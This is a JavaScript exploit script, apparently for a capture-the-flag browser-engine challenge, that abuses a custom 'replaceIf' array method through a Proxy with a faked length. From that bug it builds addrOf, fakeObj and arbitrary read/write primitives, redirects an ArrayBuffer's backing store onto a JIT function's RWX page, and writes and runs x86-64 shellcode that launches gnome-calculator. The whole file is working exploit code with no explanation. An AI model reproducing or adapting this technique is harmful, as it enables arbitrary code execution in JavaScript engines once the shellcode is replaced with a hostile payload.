/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

/**************************************************************
 *             _            
 *    ___ ___ | | ___  _ __ 
 *   / __/ _ \| |/ _ \| '__|
 *  | (_| (_) | | (_) | |   
 *   \___\___/|_|\___/|_|   
 *                          
 **************************************************************/
const RED       = "\033[0;31m";
const BLUE      = "\033[0;34m";
const GREEN     = "\033[0;32m";
const RESET     = "\033[0;0m";

function info() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(BLUE + "[*]", msg, RESET);
}

function success() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(GREEN + "[+]", msg, RESET);
}

function error() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(RED + "[!]", msg, RESET);
}

/**************************************************************
 *   _          _                     
 *  | |__   ___| |_ __   ___ _ __ ___ 
 *  | '_ \ / _ \ | '_ \ / _ \ '__/ __|
 *  | | | |  __/ | |_) |  __/ |  \__ \
 *  |_| |_|\___|_| .__/ \___|_|  |___/
 *               |_|                  
 * 
 **************************************************************/
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + Number(val).toString(16);
}

/**************************************************************
 *                   _       _ _   
 *    _____  ___ __ | | ___ (_) |_ 
 *   / _ \ \/ / '_ \| |/ _ \| | __|
 *  |  __/>  <| |_) | | (_) | | |_ 
 *   \___/_/\_\ .__/|_|\___/|_|\__|
 *            |_|                  
 * 
 **************************************************************/
function addrOf(o) {
    replaceIf(proxy, offset, function(E){return E;}, o);
    return ftoi(fltArr[0]);
}

function fakeObj(addr) {
    fake[2] = itof(addr - 0x10n);
    var temp;
    var fakeAddr = addrOf(fake);
    fltArr[0] = itof(fakeAddr - 0x20n);
    replaceIf(proxy, offset, function (E) { temp = E; return 1; }, 2.2);
    return temp;
}

function readData(addr) {
    let fakeObject = fakeObj(addr);
    return ftoi(fakeObject[0]);
}

function writeData(addr, val) {
    let fakeObject = fakeObj(addr);
    fakeObject[0] = itof(val);
}

function leakMap() {
    var fltArr0 = [1.1, 1.1, 1.1, 1.1];
    var proxy = new Proxy(fltArr0, handler);
    var fltArr1 = [2.2, 2.2, 2.2, 2.2];
    var objArr0 = [obj];
    var temp;
    replaceIf(proxy, 14, function (E){ temp = E; return false; }, 0);
    fltMap = ftoi(temp);
    replaceIf(proxy, 29, function (E){ temp = E; return false; }, 0);
    objMap = ftoi(temp);
}

function replaceIf(arr, idx, foo, newValue) {
    let result = arr.replaceIf(idx, foo, newValue);
    return result;
}

const handler = {
    get(target, property) {
        if (property == "length") {
            return 0x1337;
        }
        return target[property];
    }
}

var obj = {"3vil": "c0de"};
var fltMap, objMap;
leakMap();

var objArr = [obj];
var fltArr = [1.1];
var proxy = new Proxy(objArr, handler);
var offset = 7;
var fake = [
    itof(fltMap),
    1.2,
    1.3,
    1.4
];

let shellcode = [72,184,1,1,1,1,1,1,1,1,80,72,184,46,99,104,111,46,114,105,1,72,49,4,36,72,137,231,104,44,98,1,1,129,52,36,1,1,1,1,72,137,230,106,1,254,12,36,72,184,108,99,117,108,97,116,111,114,80,72,184,103,110,111,109,101,45,99,97,80,72,184,117,115,114,47,98,105,110,47,80,72,184,76,65,89,61,58,48,32,47,80,72,184,101,110,118,32,68,73,83,80,80,72,137,226,106,1,254,12,36,82,86,87,106,59,88,72,137,230,153,15,5];

let func_body  = "eval('');"
for (let i = 0; i < 2000; ++i)
    func_body += "a[" + i.toString() + "];" 
let func_obj = new Function("a", func_body);

let func_obj_addr = addrOf(func_obj);
info('func_addr =', hex(func_obj_addr));

let jit_func_addr = readData(func_obj_addr + 0x30n) + 0x40n;
info('jit_addr =', hex(jit_func_addr));

buf = new ArrayBuffer(0x100);
dataview = new DataView(buf);
info("evil buf @", hex(addrOf(buf)));

writeData(addrOf(buf) + 0x20n, jit_func_addr);
success("Successfully overwritten backed store with RWX page address");

info("Writing shellcode to RWX page");
for (i = 0; i < shellcode.length; ++i) {
    dataview.setUint8(i, shellcode[i], true);
}

func_obj({});
